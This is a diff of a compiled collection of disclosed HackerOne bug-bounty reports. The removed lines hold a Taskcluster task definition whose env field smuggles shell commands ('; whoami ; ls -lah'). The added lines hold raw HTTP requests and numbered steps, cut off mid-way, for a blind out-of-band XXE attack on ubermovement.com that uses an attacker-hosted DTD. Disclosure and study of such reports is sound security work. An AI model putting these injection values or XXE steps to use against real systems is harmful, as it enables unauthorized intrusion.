@@ -1674,44 +1674,42 @@ id
 uid=1000(prod) gid=1000(prod) groups=1000(prod)
 ```
 
-## #2221404 RCE on worker host due to unsanitized "env" variable name in task definition on community-tc.services.mozilla.com — mozilla — $500 — Code Injection
-Source: `hackerone/reports/2024/2221404.md` (https://hackerone.com/reports/2221404)
+## #154096 Blind OOB XXE At "http://ubermovement.com/" — uber — $500 — Command Injection - Generic
+Source: `hackerone/reports/2016/154096.md` (https://hackerone.com/reports/154096)
 
 ```
-retries: 0
-created: '2023-10-23T08:10:11.044Z'
-deadline: '2023-10-23T11:10:11.044Z'
-expires: '2024-10-23T11:10:11.044Z'
-taskQueueId: proj-misc/tutorial
-projectId: none
-tags: {}
-scopes: []
-payload:
-  env:
-# Commands to run in here
-    test2 --help ; whoami ; ls -lah ;: '--help'
-  image: ubuntu:latest
-  command:
-    - /bin/bash
-    - '-c'
-    - 'echo hello'
-  maxRunTime: 5000
-extra: {}
-metadata:
-  name: example-task
-  description: An **example** task
-  owner: name@example.com
-  source: https://community-tc.services.mozilla.com/tasks/create
-schedulerId: taskcluster-ui
+GET /api/search/GeneralSearch HTTP/1.1
+Host: ubermovement.com
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+
+4. NOW,
 ```
 
 ```
-    test2 --help ; whoami ; ls -lah ;: '--help'
+POST /api/search/GeneralSearch HTTP/1.1
+Host: ubermovement.com
+Content-Length: 173
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+5. Now Add content type :
 ```
 
 ```
-    - /bin/bash
-    - '-c'
-    - 'echo hello'
+POST /api/search/GeneralSearch HTTP/1.1
+Content-type: application/xml
+Host: ubermovement.com
+Content-Length: 173
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+6. Deploy web server and host "payload.dtd" File eg :
 ```
 
